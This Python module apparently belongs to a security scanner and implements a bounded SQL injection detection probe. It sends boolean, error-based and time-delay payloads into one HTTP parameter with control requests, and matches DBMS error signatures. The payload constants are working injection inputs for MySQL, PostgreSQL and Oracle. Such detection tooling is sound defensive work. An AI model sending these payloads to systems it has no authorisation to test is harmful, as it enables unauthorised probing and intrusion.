"""SQL injection probe: boolean, error and time based, each with a control.

The probe confirms injection in ONE named parameter by differential
behaviour. It does not extract data: no UNION, no enumeration, no stacked
queries, no out-of-band channel. Every payload is a constant in this module
and none of them writes, deletes, reads a file or sleeps longer than
``DELAY_SECONDS``.

Request sequence (never more than ``MAX_REQUESTS``):

1. the valid value twice (baseline, and proof that the page is stable);
2. a TRUE / FALSE condition pair, in a string context and, for a numeric
   value, in a numeric context too;
3. a single quote, and when that produces a DBMS error message, two quotes
   (the control: a balanced literal must not produce the message);
4. only when asked (``allow_time``): one bounded delay payload per DBMS
   family, and for a slow answer the same payload with a zero delay.

A positive verdict always rests on a control request that rules out
coincidence; anything the probe could not attribute is reported as
``vulnerable: null``.
"""

from __future__ import annotations

import html
import json
import re
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

from buggy.capture.gateway import GatewayRefusal
from buggy.capture.probes.base import (
    Context,
    ProbeInputError,
    ProbeResult,
    headers_of,
    require,
    set_path,
    similarity,
    text,
)
from buggy.capture.store import Capture

PROBE = "sqli"
VULN_CLASS = "injection"
CWE = "CWE-89"
REMEDIATION = (
    "Use parameterised queries (prepared statements / bound parameters) for every statement; "
    "do not build SQL from request data by concatenation or string formatting. Return a "
    "generic error page instead of the database's message."
)

MAX_REQUESTS = 9
LOCATIONS = ("query", "json", "form")

# Two baselines less alike than this: the page changes by itself, nothing can be compared.
STABLE_SIMILARITY = 0.98
# The TRUE condition must leave the page as it was ...
TRUE_SIMILARITY = 0.95
# ... and the FALSE condition must change it clearly (or change the status).
FALSE_SIMILARITY = 0.80

BOOLEAN_STRING = ("' AND '1'='1", "' AND '1'='2")
BOOLEAN_NUMERIC = (" AND 1=1", " AND 1=2")
QUOTE = "'"
QUOTE_PAIR = "''"

DELAY_SECONDS = 3
DELAY_MIN_EXTRA_MS = 2500.0  # the delayed answer must be at least this much slower
CONTROL_MAX_EXTRA_MS = 1000.0  # the zero-delay control must stay this close to the baseline

# One condition per DBMS family that waits ``{seconds}`` seconds exactly once
# (an uncorrelated subquery, so the wait does not multiply by the row count)
# and is then true. ``{seconds}`` is 3 for the proof and 0 for its control.
# SQL Server is absent on purpose: WAITFOR needs a stacked query, which is
# out of bounds for this probe. SQLite has no bounded delay at all.
TIME_CONDITIONS: tuple[tuple[str, str], ...] = (
    ("mysql", "3=(SELECT 3 FROM (SELECT SLEEP({seconds}) AS s) AS t WHERE t.s=0)"),
    ("postgresql", "3=(SELECT 3 FROM pg_sleep({seconds}))"),
    ("oracle", "3=(SELECT 3 FROM dual WHERE DBMS_PIPE.RECEIVE_MESSAGE(CHR(98),{seconds})=1)"),
)

_Q = r"(?:\"|')"  # the quote a DBMS puts around the offending token
# A stack frame inside an ORM's query runner for one dialect: the statement failed in the DBMS.
_ORM_FRAME = r"sequelize[/\\]lib[/\\]dialects[/\\]{dialect}[/\\]query\b"
ERROR_SIGNATURES: dict[str, tuple[str, ...]] = {
    "sqlite": (
        r"SQLITE_ERROR",
        r"sqlite3\.OperationalError",
        r"System\.Data\.SQLite\.SQLiteException",
        rf"near {_Q}[^\n]{{0,120}}{_Q}: syntax error",
        r"unrecognized token: ",
        _ORM_FRAME.format(dialect="sqlite"),
    ),
    "mysql": (
        r"You have an error in your SQL syntax",
        r"check the manual that corresponds to your (?:MySQL|MariaDB) server version",
        r"MySqlException|MySQLSyntaxErrorException",
        r"com\.mysql\.(?:cj\.)?jdbc",
        r"Warning\b[^\n]{0,80}\bmysqli?_",
        _ORM_FRAME.format(dialect="(?:mysql|mariadb)"),
    ),
    "postgresql": (
        r"unterminated quoted string at or near",
        rf"syntax error at or near {_Q}",
        r"org\.postgresql\.util\.PSQLException",
        r"Warning\b[^\n]{0,80}\bpg_(?:query|exec|send_query)\(",
        r"PG::SyntaxError|psycopg2\.errors\.",
        _ORM_FRAME.format(dialect="postgres"),
    ),
    "mssql": (
        r"Unclosed quotation mark after the character string",
        rf"Incorrect syntax near {_Q}",
        r"System\.Data\.SqlClient\.SqlException",
        r"com\.microsoft\.sqlserver\.jdbc\.SQLServerException",
        r"\[(?:ODBC )?SQL Server(?: Native Client [\d.]+)?\]|ODBC SQL Server Driver",
        _ORM_FRAME.format(dialect="mssql"),
    ),
    "oracle": (
        r"\bORA-\d{5}\b",
        r"quoted string not properly terminated",
        r"SQL command not properly ended",
        r"oracle\.jdbc\.|OracleException",
        _ORM_FRAME.format(dialect="oracle"),
    ),
}
_COMPILED: tuple[tuple[str, str, re.Pattern[str]], ...] = tuple(
    (family, pattern, re.compile(pattern, re.IGNORECASE))
    for family, patterns in ERROR_SIGNATURES.items()
    for pattern in patterns
)
_NUMERIC = re.compile(r"-?\d+(?:\.\d+)?")
_MISSING = object()


class _BudgetExceeded(RuntimeError):
    """The request bound was reached; nothing more is sent."""


def error_signatures(body: str) -> list[tuple[str, str]]:
    """``(dbms family, pattern)`` for every DBMS error signature found in ``body``."""
    haystack = html.unescape(body[:200_000])
    return [(family, pattern) for family, pattern, regex in _COMPILED if regex.search(haystack)]


def _is_numeric(value: Any) -> bool:
    if isinstance(value, bool):
        return False
    if isinstance(value, (int, float)):
        return True
    return isinstance(value, str) and _NUMERIC.fullmatch(value) is not None


def _get_path(document: dict[str, Any], path: str) -> Any:
    cursor: Any = document
    for part in path.split("."):
        if not isinstance(cursor, dict) or part not in cursor:
            return _MISSING
        cursor = cursor[part]
    return cursor


def _replace_pair(pairs: list[tuple[str, str]], name: str, value: str) -> list[tuple[str, str]]:
    """``pairs`` with the first ``name`` set to ``value`` (appended when absent)."""
    out: list[tuple[str, str]] = []
    done = False
    for key, old in pairs:
        if key == name and not done:
            out.append((key, value))
            done = True
        else:
            out.append((key, old))
    if not done:
        out.append((name, value))
    return out


@dataclass(frozen=True)
class _Target:
    """Where the parameter lives and how to build a request that carries a value in it."""

    method: str
    url: str
    location: str
    parameter: str
    headers: dict[str, str]
    json_body: dict[str, Any] | None
    form_pairs: list[tuple[str, str]]
    raw_body: str | None
    value: Any

    @classmethod
    def from_params(cls, params: dict[str, Any]) -> _Target:
        require(params, "url", "parameter")
        url, parameter = str(params["url"]), str(params["parameter"])
        method = str(params.get("method") or "GET").upper()
        location = str(params.get("location") or "query").lower()
        if location not in LOCATIONS:
            raise ProbeInputError(f"location must be one of {', '.join(LOCATIONS)}")
        headers = headers_of(params.get("headers"))
        body = params.get("body")
        json_body: dict[str, Any] | None = None
        form_pairs: list[tuple[str, str]] = []
        raw_body: str | None = None
        found: Any = _MISSING

        if location == "query":
            raw_body = None if body in (None, "") else _as_text(body)
            for key, old in parse_qsl(urlsplit(url).query, keep_blank_values=True):
                if key == parameter:
                    found = old
                    break
        elif location == "json":
            if isinstance(body, str) and body.strip():
                try:
                    body = json.loads(body)
                except ValueError as exc:
                    raise ProbeInputError("body is not valid JSON") from exc
            if body in (None, ""):
                body = {}
            if not isinstance(body, dict):
                raise ProbeInputError("body must be a JSON object when location is json")
            json_body = body
            found = _get_path(json_body, parameter)
            headers = {"Content-Type": "application/json", **headers}
        else:
            if isinstance(body, dict):
                form_pairs = [(str(k), str(v)) for k, v in body.items()]
            elif body in (None, ""):
                form_pairs = []
            elif isinstance(body, str):
                form_pairs = parse_qsl(body, keep_blank_values=True)
            else:
                raise ProbeInputError("body must be a form string or an object of fields")
            for key, old in form_pairs:
                if key == parameter:
                    found = old
                    break
            headers = {"Content-Type": "application/x-www-form-urlencoded", **headers}

        value = params.get("value")
        if value is None:
            value = found
        if value is _MISSING or value is None or isinstance(value, (dict, list)):
            raise ProbeInputError(
                f"value is required: give a valid baseline value for {parameter!r} "
                f"(it is not present in the {location})"
            )
        return cls(method, url, location, parameter, headers, json_body, form_pairs, raw_body, value)  # fmt: skip

    @property
    def numeric(self) -> bool:
        return _is_numeric(self.value)

    def inject(self, suffix: str) -> str:
        """The baseline value with a payload appended."""
        return f"{self.value}{suffix}"

    def request(self, value: Any) -> tuple[str, str | None]:
        """``(url, body)`` of the request that carries ``value`` in the parameter."""
        if self.location == "query":
            parts = urlsplit(self.url)
            pairs = parse_qsl(parts.query, keep_blank_values=True)
            query = urlencode(_replace_pair(pairs, self.parameter, str(value)))
            return urlunsplit(parts._replace(query=query)), self.raw_body
        if self.location == "json":
            return self.url, json.dumps(set_path(self.json_body or {}, self.parameter, value))
        return self.url, urlencode(_replace_pair(self.form_pairs, self.parameter, str(value)))


def _as_text(body: Any) -> str:
    return json.dumps(body) if isinstance(body, (dict, list)) else str(body)


@dataclass
class _Run:
    """One execution: sends through the gateway, counts, and remembers which capture is which."""

    ctx: Context
    target: _Target
    evidence: list[str] = field(default_factory=list)
    captures: dict[str, str] = field(default_factory=dict)
    payloads: dict[str, Any] = field(default_factory=dict)
    info: dict[str, Any] = field(default_factory=dict)
    unresolved: list[str] = field(default_factory=list)
    technique: str | None = None
    dbms_guess: str | None = None

    @property
    def left(self) -> int:
        return MAX_REQUESTS - len(self.evidence)

    def send(self, role: str, value: Any, note: str) -> Capture:
        if self.left <= 0:
            raise _BudgetExceeded(role)
        url, body = self.target.request(value)
        self.payloads[role] = value
        capture = self.ctx.send(
            self.target.method, url, headers=self.target.headers, body=body, note=note
        )
        self.evidence.append(capture.id)
        self.captures[role] = capture.id
        return capture

    def result(self, vulnerable: bool | None, summary: str) -> ProbeResult:
        details: dict[str, Any] = {
            "technique": self.technique,
            "dbms_guess": self.dbms_guess,
            "method": self.target.method,
            "location": self.target.location,
            "parameter": self.target.parameter,
            "requests_sent": len(self.evidence),
            "max_requests": MAX_REQUESTS,
            "captures": dict(self.captures),
            "payloads": dict(self.payloads),
            **self.info,
        }
        if self.unresolved:
            details["unresolved"] = list(self.unresolved)
        return ProbeResult(
            PROBE, VULN_CLASS, CWE, vulnerable, summary, list(self.evidence), details, REMEDIATION
        )


def _failed(capture: Capture) -> bool:
    """No usable answer: a transport error, or the server itself broke."""
    return bool(capture.error) or capture.status is None or capture.status >= 500


def _outcome(capture: Capture) -> str:
    return capture.error or f"HTTP {capture.status}"


def sqli(ctx: Context, params: dict[str, Any]) -> ProbeResult:
    """Is one named parameter injectable into a SQL statement?"""
    target = _Target.from_params(params)
    allow_time = params.get("allow_time") is True or str(params.get("allow_time")).lower() == "true"
    run = _Run(ctx, target)
    run.info["allow_time"] = allow_time
    try:
        return _examine(run, allow_time)
    except GatewayRefusal as refusal:
        run.info["refusal"] = refusal.to_dict()
        return run.result(
            None,
            f"the gateway refused a request ({refusal.code}) after {len(run.evidence)} sent; "
            "cannot tell",
        )
    except _BudgetExceeded as exc:
        return run.result(
            None, f"the request bound ({MAX_REQUESTS}) was reached before {exc}; cannot tell"
        )


def _examine(run: _Run, allow_time: bool) -> ProbeResult:
    target = run.target

    # 1. Baseline, twice.
    first = run.send("baseline", target.value, "baseline (valid value)")
    if _failed(first):
        return run.result(
            None, f"the baseline request failed ({_outcome(first)}); nothing to compare against"
        )
    second = run.send("baseline_repeat", target.value, "baseline repeated (is the page stable?)")
    stability = similarity(first, second)
    baseline_ms = max(first.elapsed_ms, second.elapsed_ms)
    run.info["baseline"] = {
        "status": first.status,
        "repeat_status": second.status,
        "similarity": stability,
        "elapsed_ms": round(baseline_ms, 1),
    }
    if _failed(second) or second.status != first.status or stability < STABLE_SIMILARITY:
        return run.result(
            None,
            "the page is unstable: two identical requests answered differently "
            f"({_outcome(first)} / {_outcome(second)}, similarity {stability}); cannot compare",
        )

    # 2. Boolean pair(s).
    variants = [("string", BOOLEAN_STRING)]
    if target.numeric:
        variants.insert(0, ("numeric", BOOLEAN_NUMERIC))
    run.info["boolean"] = []
    for name, (true_suffix, false_suffix) in variants:
        true = run.send(
            f"boolean_true_{name}", target.inject(true_suffix), f"TRUE condition ({name} context)"
        )
        false = run.send(
            f"boolean_false_{name}",
            target.inject(false_suffix),
            f"FALSE condition ({name} context)",
        )
        entry: dict[str, Any] = {
            "variant": name,
            "true_status": true.status,
            "false_status": false.status,
            "true_similarity": similarity(first, true),
            "false_similarity": similarity(first, false),
            "positive": False,
        }
        run.info["boolean"].append(entry)
        if true.error or false.error:
            run.unresolved.append(f"a boolean ({name}) request got no answer")
            continue
        true_holds = true.status == first.status and entry["true_similarity"] >= TRUE_SIMILARITY
        false_differs = false.status != first.status or entry["false_similarity"] < FALSE_SIMILARITY
        if true_holds and false_differs:
            entry["positive"] = True
            run.technique = "boolean"
            return run.result(
                True,
                f"{target.parameter!r} is evaluated as SQL: a TRUE condition leaves the response "
                f"unchanged (similarity {entry['true_similarity']}) and the matching FALSE "
                f"condition changes it (HTTP {false.status}, similarity "
                f"{entry['false_similarity']})",
            )

    # 3. Error signature, with the balanced-quote control.
    quote = run.send("error_quote", target.inject(QUOTE), "single quote (unbalanced)")
    known = set(error_signatures(text(first)))
    fresh = [hit for hit in error_signatures(text(quote)) if hit not in known]
    error: dict[str, Any] = {
        "quote_status": quote.status,
        "signatures": [pattern for _family, pattern in fresh],
        "signature_dbms": sorted({family for family, _pattern in fresh}),
        "confirmed": False,
    }
    run.info["error"] = error
    guess = fresh[0][0] if fresh else None
    if quote.error:
        run.unresolved.append("the single-quote request got no answer")
    elif fresh:
        control = run.send("error_control", target.inject(QUOTE_PAIR), "two quotes (control)")
        in_control = [hit for hit in error_signatures(text(control)) if hit not in known]
        error["control_status"] = control.status
        error["control_signatures"] = [pattern for _family, pattern in in_control]
        if control.error:
            run.unresolved.append("the two-quote control got no answer")
        elif not in_control:
            error["confirmed"] = True
            run.technique, run.dbms_guess = "error", guess
            return run.result(
                True,
                f"a single quote in {target.parameter!r} produces a {guess} error message "
                f"(HTTP {quote.status}) and two quotes do not (HTTP {control.status}): the "
                "value reaches the SQL statement unescaped",
            )
        else:
            run.unresolved.append(
                "a DBMS error message appears for one quote AND for two quotes, so it cannot "
                "be attributed to an unbalanced SQL literal"
            )
    elif quote.status != first.status:
        error["note"] = (
            f"the single quote changed the status ({first.status} -> {quote.status}) without a "
            "DBMS error message; not counted as a signal"
        )

    # 4. Time delay, only on request and only with what is left of the request bound.
    if allow_time:
        outcome = _time_signal(run, baseline_ms, guess)
        if outcome is not None:
            return outcome

    if run.unresolved:
        return run.result(None, "cannot tell: " + "; ".join(run.unresolved))
    checked = "boolean, error" + (" and time" if allow_time else "")
    return run.result(
        False,
        f"no SQL injection signal in {target.parameter!r}: the {checked} checks were all negative",
    )


def _time_signal(run: _Run, baseline_ms: float, preferred: str | None) -> ProbeResult | None:
    """Try the bounded delay payloads; a result ends the probe, ``None`` means negative."""
    target = run.target
    conditions = sorted(TIME_CONDITIONS, key=lambda item: item[0] != preferred)
    # Each family needs its own control, so one request is kept back for it.
    affordable = max(0, min(len(conditions), run.left - 1))
    timing: dict[str, Any] = {
        "baseline_ms": round(baseline_ms, 1),
        "delay_seconds": DELAY_SECONDS,
        "tried": [],
        "skipped_for_request_bound": [family for family, _ in conditions[affordable:]],
    }
    run.info["time"] = timing

    def payload(condition: str, seconds: int) -> str:
        expression = condition.format(seconds=seconds)
        if target.numeric:
            return target.inject(f" AND {expression}")
        return target.inject(f"' AND {expression} AND '1'='1")

    for family, condition in conditions[:affordable]:
        delayed = run.send(
            f"time_delay_{family}", payload(condition, DELAY_SECONDS), f"{family} 3 s delay"
        )
        extra = delayed.elapsed_ms - baseline_ms
        entry: dict[str, Any] = {"dbms": family, "delay_extra_ms": round(extra, 1)}
        timing["tried"].append(entry)
        if delayed.error:
            run.unresolved.append(f"the {family} delay request got no answer; timing stopped")
            return None
        if extra < DELAY_MIN_EXTRA_MS:
            continue
        control = run.send(
            f"time_control_{family}", payload(condition, 0), f"{family} zero delay (control)"
        )
        control_extra = control.elapsed_ms - baseline_ms
        entry["control_extra_ms"] = round(control_extra, 1)
        if not control.error and control_extra <= CONTROL_MAX_EXTRA_MS:
            run.technique, run.dbms_guess = "time", family
            return run.result(
                True,
                f"a {DELAY_SECONDS} s {family} delay in {target.parameter!r} slows the response "
                f"by {round(extra / 1000, 1)} s while the same payload with a zero delay does "
                f"not ({round(control_extra / 1000, 1)} s)",
            )
        return run.result(
            None,
            f"the {family} delay payload was slow (+{round(extra / 1000, 1)} s) but so was its "
            f"zero-delay control (+{round(control_extra / 1000, 1)} s): timing is unreliable; "
            "cannot tell",
        )
    return None


__all__ = [
    "BOOLEAN_NUMERIC",
    "BOOLEAN_STRING",
    "DELAY_SECONDS",
    "ERROR_SIGNATURES",
    "MAX_REQUESTS",
    "TIME_CONDITIONS",
    "error_signatures",
    "sqli",
]
